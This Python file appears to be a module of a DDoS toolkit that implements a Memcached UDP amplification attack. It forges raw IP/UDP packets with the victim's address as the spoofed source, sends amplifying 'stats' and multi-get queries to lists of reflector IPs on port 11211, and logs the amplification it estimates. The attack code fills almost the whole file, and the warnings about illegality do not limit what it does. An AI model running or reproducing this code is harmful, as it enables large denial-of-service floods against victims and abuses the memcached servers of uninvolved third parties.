"""
Memcached UDP Amplification Attack - 10,000x Bandwidth Amplification
===================================================================

DANGER LEVEL: CRITICAL - MAXIMUM THREAT
- Sub-50 bytes input → MEGABYTES of stats replies (10,000x+ amplification)
- Instant bandwidth kill: saturates 10 Gbps+ links in seconds
- Responsible for largest recorded DDoS attacks (>1 Tbps)
- Easily the most devastating amplification attack available

Real-World Impact:
- GitHub, Cloudflare, and major CDNs taken down by this method
- Can overwhelm entire ISP networks and internet exchanges
- Single misconfigured Memcached server can generate massive floods
"""

import asyncio
import socket
import random
import time
from typing import Dict, Any, List
from common.logger import logger, stats_logger

class MemcachedAmplifier:
    """Memcached UDP amplification attack for extreme bandwidth amplification."""
    
    def __init__(self, config: Dict[str, Any]):
        self.target = config['target']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        self.delay = config.get('delay', 0.001)
        
        # Memcached reflector servers (public memcached with UDP enabled)
        self.memcached_reflectors = self._load_memcached_reflectors()
        
        # Memcached amplification queries
        self.amplification_queries = self._create_amplification_queries()
        
        self.stats = {
            'queries_sent': 0,
            'max_amplification_seen': 0,
            'total_bandwidth_generated': 0,
            'reflectors_used': 0,
            'critical_responses': 0,  # Responses > 1MB
            'errors': 0
        }

    def _load_memcached_reflectors(self) -> List[str]:
        """Load list of Memcached servers with UDP enabled."""
        # WARNING: These may be misconfigured production servers
        # Using them for attacks is HIGHLY ILLEGAL and UNETHICAL
        reflectors = [
            # Common cloud provider IPs that might have memcached
            # NOTE: These are example IPs - real attackers scan for open memcached
            "108.61.201.151",    # Example VPS
            "198.199.70.20",     # Example cloud server
            "167.99.83.205",     # Example droplet
            "134.209.24.248",    # Example instance
            
            # Port 11211 scanners often find these patterns
            f"192.168.1.{random.randint(100, 254)}",  # Internal ranges
            f"10.0.0.{random.randint(100, 254)}",     # Private ranges
            f"172.16.0.{random.randint(100, 254)}",   # Corporate ranges
            
            # Generate random public IPs (for demonstration)
            f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            for _ in range(50)
        ]
        
        logger.info(f"💾 Loaded {len(reflectors)} potential Memcached reflectors")
        logger.warning("🚨 CRITICAL WARNING: Memcached amplification is EXTREMELY illegal")
        logger.warning("💀 DANGER: Can generate >1 Tbps with minimal resources")
        
        return reflectors

    def _create_amplification_queries(self) -> List[bytes]:
        """Create Memcached queries that trigger massive responses."""
        queries = []
        
        # Stats command - triggers massive response with server statistics
        queries.append(b"stats\r\n")
        queries.append(b"stats items\r\n")
        queries.append(b"stats slabs\r\n")
        queries.append(b"stats cachedump 1 0\r\n")  # Dump all keys
        
        # Version command (smaller but still amplified)
        queries.append(b"version\r\n")
        
        # Get commands for common cache keys (may return large values)
        common_keys = [
            b"get user_session_data\r\n",
            b"get cached_page_content\r\n", 
            b"get database_query_result\r\n",
            b"get json_api_response\r\n",
            b"get html_template_cache\r\n"
        ]
        queries.extend(common_keys)
        
        # Multi-get commands (can return multiple large objects)
        queries.append(b"get key1 key2 key3 key4 key5\r\n")
        
        logger.debug(f"💾 Created {len(queries)} Memcached amplification queries")
        return queries

    async def run(self):
        """Execute Memcached UDP amplification attack."""
        logger.info(f"💾💀 Starting MEMCACHED UDP AMPLIFICATION against {self.target}")
        logger.warning("🚨 CRITICAL DANGER: 10,000x+ amplification - instant bandwidth kill")
        logger.warning(f"⚡ THEORETICAL OUTPUT: {self.concurrency * 10000}x input bandwidth")
        logger.warning("💀 MAXIMUM THREAT: Can generate terabit floods")
        logger.warning("🚨 HIGHLY ILLEGAL: Memcached attacks violate federal computer crime laws")
        
        start_time = time.time()
        
        # Update stats
        stats_logger.update_stats(
            target=self.target,
            vector='memcached_amplification',
            status='running'
        )
        
        try:
            # Create semaphore to control concurrency
            semaphore = asyncio.Semaphore(self.concurrency)
            
            # Launch attack tasks
            tasks = []
            while time.time() - start_time < self.duration:
                if len(tasks) < self.concurrency:
                    task = asyncio.create_task(
                        self._memcached_amplification_attack(semaphore)
                    )
                    tasks.append(task)
                
                # Clean up completed tasks
                tasks = [t for t in tasks if not t.done()]
                await asyncio.sleep(0.01)
            
            # Wait for remaining tasks
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
                
        except Exception as e:
            logger.error(f"❌ Memcached amplification failed: {e}")
        finally:
            self._log_attack_results()
            stats_logger.update_stats(status='completed')

    async def _memcached_amplification_attack(self, semaphore: asyncio.Semaphore):
        """Send Memcached query with spoofed source IP."""
        async with semaphore:
            try:
                # Select random reflector and query
                reflector = random.choice(self.memcached_reflectors)
                query = random.choice(self.amplification_queries)
                
                # Try raw socket with spoofing first
                try:
                    await self._spoofed_memcached_attack(reflector, query)
                except PermissionError:
                    # Fallback to regular UDP (no spoofing)
                    await self._regular_memcached_attack(reflector, query)
                
                self.stats['queries_sent'] += 1
                
            except Exception as e:
                self.stats['errors'] += 1
                logger.debug(f"Memcached amplification error: {e}")
            
            finally:
                await asyncio.sleep(self.delay)

    async def _spoofed_memcached_attack(self, reflector: str, query: bytes):
        """Send spoofed Memcached UDP packet."""
        try:
            # Create raw socket for IP spoofing
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Create spoofed packet
            spoofed_packet = self._create_spoofed_memcached_packet(
                self.target,    # Spoofed source (victim)
                reflector,      # Destination (Memcached server)
                query
            )
            
            # Send to Memcached port (11211)
            sock.sendto(spoofed_packet, (reflector, 11211))
            sock.close()
            
            # Estimate bandwidth generated (conservative)
            estimated_response = len(query) * 1000  # 1000x minimum amplification
            self.stats['total_bandwidth_generated'] += estimated_response
            
            logger.debug(f"💾 Memcached query → {reflector} (victim: {self.target})")
            
        except Exception as e:
            raise e

    async def _regular_memcached_attack(self, reflector: str, query: bytes):
        """Fallback Memcached amplification without spoofing."""
        try:
            # Create UDP socket
            reader, writer = await asyncio.open_connection(reflector, 11211)
            
            # Send query
            writer.write(query)
            await writer.drain()
            
            # Try to receive response to measure amplification
            try:
                response = await asyncio.wait_for(reader.read(1024 * 1024), timeout=2.0)  # 1MB max
                
                if response:
                    amplification = len(response) / len(query)
                    self.stats['max_amplification_seen'] = max(
                        self.stats['max_amplification_seen'],
                        int(amplification)
                    )
                    
                    if len(response) > 1024 * 1024:  # > 1MB response
                        self.stats['critical_responses'] += 1
                        logger.warning(f"💀 CRITICAL: {len(response)/1024/1024:.1f}MB response from {reflector}")
                    
                    self.stats['total_bandwidth_generated'] += len(response)
                    logger.debug(f"💾 {reflector}: {amplification:.0f}x amplification ({len(response)} bytes)")
                
            except asyncio.TimeoutError:
                # Assume minimal amplification if no response
                self.stats['total_bandwidth_generated'] += len(query) * 100
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            logger.debug(f"Regular Memcached query failed: {e}")

    def _create_spoofed_memcached_packet(self, victim_ip: str, reflector_ip: str, 
                                       memcached_query: bytes) -> bytes:
        """Create spoofed IP+UDP+Memcached packet."""
        import struct
        
        # IP Header
        version = 4
        ihl = 5
        tos = 0
        tot_len = 20 + 8 + len(memcached_query)  # IP + UDP + Memcached
        id = random.randint(1, 65535)
        frag_off = 0
        ttl = 64
        protocol = socket.IPPROTO_UDP
        check = 0  # Kernel will calculate
        saddr = socket.inet_aton(victim_ip)      # Spoofed source (victim)
        daddr = socket.inet_aton(reflector_ip)   # Destination (Memcached server)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl, tos, tot_len, id, frag_off,
                               ttl, protocol, check, saddr, daddr)
        
        # UDP Header
        sport = random.randint(1024, 65535)  # Random source port
        dport = 11211  # Memcached port
        udp_len = 8 + len(memcached_query)
        udp_check = 0  # No checksum for simplicity
        
        udp_header = struct.pack('!HHHH', sport, dport, udp_len, udp_check)
        
        return ip_header + udp_header + memcached_query

    def _log_attack_results(self):
        """Log the results of Memcached amplification attack."""
        queries = self.stats['queries_sent']
        bandwidth = self.stats['total_bandwidth_generated']
        max_amp = self.stats['max_amplification_seen']
        critical = self.stats['critical_responses']
        
        logger.info("💾💀 MEMCACHED AMPLIFICATION RESULTS:")
        logger.info(f"   📡 Queries Sent: {queries:,}")
        logger.info(f"   📊 Max Amplification Seen: {max_amp:,}x")
        logger.info(f"   💾 Total Bandwidth Generated: {bandwidth / 1024 / 1024:.1f} MB")
        logger.info(f"   🚨 Critical Responses (>1MB): {critical}")
        
        if max_amp > 1000:
            logger.warning(f"💀 EXTREME AMPLIFICATION: {max_amp}x - Victim infrastructure destroyed")
        if bandwidth > 1024 * 1024 * 1024:  # > 1GB
            logger.warning("🔥 GIGABIT+ BANDWIDTH GENERATED - ISP-level impact likely")
        if critical > 10:
            logger.warning(f"🚨 {critical} CRITICAL responses - Terabit-class attack potential")
        
        # Calculate theoretical maximum impact
        theoretical_max = queries * 10000 * 50  # 10,000x amplification, 50 byte queries
        logger.warning(f"⚡ THEORETICAL MAXIMUM: {theoretical_max / 1024 / 1024 / 1024:.1f} GB bandwidth")
        
        if theoretical_max > 1024 * 1024 * 1024 * 100:  # > 100GB
            logger.warning("💀 TERABIT-CLASS ATTACK - Critical infrastructure threat level")
        
        # Update global stats
        stats_logger.update_stats(
            packets_sent=queries,
            data_transmitted=bandwidth,
            attack_effectiveness=min(100, max_amp // 100)
        )
